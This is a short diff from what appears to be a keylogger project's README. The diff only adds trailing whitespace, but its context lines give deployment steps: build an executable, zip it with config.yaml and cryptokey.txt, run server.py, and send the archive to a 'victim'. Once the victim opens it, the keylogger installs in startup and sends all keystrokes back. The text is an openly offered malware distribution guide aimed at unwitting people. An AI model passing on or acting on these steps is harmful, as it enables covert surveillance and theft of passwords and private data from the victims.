@@ -24,7 +24,7 @@ The dist folder will contain the finished .exe file
 Once you've built the .exe, create a new zip archive and copy this files into it:
 - config.yaml
 - cryptokey.txt
-- Your builded .exe
+- Your builded .exe  
 After that, run ``server.py``, send the archive to someone  
 And after the victim opens your .exe, the keylogger will be installed in the startup and will transmit all keystrokes to you.
 
